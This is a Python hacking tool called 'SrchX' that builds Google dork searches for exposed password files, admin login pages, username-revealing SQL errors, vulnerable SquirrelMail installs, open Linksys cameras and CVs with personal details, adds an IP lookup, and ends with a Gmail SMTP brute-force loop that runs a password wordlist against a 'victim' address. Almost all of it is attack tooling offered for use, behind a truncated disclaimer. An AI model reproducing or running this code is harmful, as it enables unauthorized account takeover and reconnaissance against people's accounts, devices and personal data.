from googlesearch import search
from colorama import Fore, init
init()
print(Fore.CYAN)

import time
time.sleep(1)

banner = """
000000000000000000000000000
0   ----  SrchX ----      0
0           by            0
0      Blacksterhack      0
000000000000000000000000000
"""
print(banner)

Disclaimer = "This program was created for purposes only"
print(Disclaimer)

time.sleep(1)

Menu = """
1- Users and admins passwords(Web pages).
2- Pages with login forms.
3- Files with user names or error messages that reveal the username.
4- Detection of the web server version or vulnerable product.
5- Hardware devices online(cameras, prints, etc).
6- Sensitive directories on a server.
7- Information to support access.
8- IP info Gathering.
9- Gmail BruteForce.

"""
print(Menu)

#Variables.
user_admins = "ext:pwd inurl:(service | authors | administrators | users) “# -FrontPage-“"
L_forms = "inurl:/admin/login.asp"
f_use_names = "“access denied for user” “using password” “general error” -inurl:phpbb “sql error”"
dec_web_server = "“SquirrelMail version 1.4.4” inurl:src ext:php"
hard_dev = "camera linksys inurl:main.cgi"
sen_fic = "“phone  * * *” “address *” “e-mail” intitle:”curriculum vitae”"
Inf_SA = "inurl:”:8080″ -intext:8080"

option = int(input("Choose an option: "))
#searching with the googlesearch module.
if option==1:
	for i in search(user_admins, start = 0, num = 30 , pause = 2):
		print(Fore.GREEN)
		print(i)

if option==2:
	for i in search(L_forms, start = 0, num = 30, pause = 2):
		print(Fore.CYAN)
		print(i)

if option==3:
	for i in search(f_use_names, start = 0, num = 30, pause = 2):
		print(Fore.MAGENTA)
		print(i)

if option==4:
	for i in search(dec_web_server, start = 0, num = 30, pause = 2):
		print(Fore.RED)
		print(i)

if option==5:
	for i in search(hard_dev, start = 0, num = 30, pause = 2):
		print(Fore.YELLOW)
		print(i)


if option==6:
	for i in search(sen_fic, start = 0, num = 30, pause = 2):
		print(Fore.WHITE)
		print(i)
		

if option==7:
	for i in search(Inf_SA, start = 0, num = 30, pause = 2):
		print(Fore.BLUE)
		print(i)


if option==8:
	import urllib.request
	import json
	from colorama import Fore, init
	init()
	

	banner = """
	00000000000000000000000000000000000000000000000000
	0             IPI info gathering                 0
	00000000000000000000000000000000000000000000000000
	By: Blacksterhack.
	"""
	print(banner)

	ip = str(input("Type your IP here: "))
	srch = "https://ipinfo.io/"+ip+"/json"

	url = urllib.request.urlopen(srch)
	load = json.loads(url.read())
	print(Fore.MAGENTA)


	for date in load:
		print(date + ">>>>" +  load[date])


if option==9:
	import smtplib
	banner = """
	000000000000000000000000000000000000000
	0           Gmail BruteForce          0
	000000000000000000000000000000000000000
	By: Blacksterhack.
	"""
	print(banner)
	gmail_server = smtplib.SMTP("smtp.gmail.com", 587)
	gmail_server.ehlo()
	gmail_server.starttls()
	user = input("Type Victim Email: ")
	Wordlist = input("Type here your Wordlist: ")
	passwfile = open(Wordlist, "r")
	for password in passwfile:
		try:
			gmail_server.login(user, password)

			print("[+] Password Found: %s" % password)
			break;
		except smtplib.SMTPAuthenticationError:
			print ("[!] Password Incorrect: %s" % password)
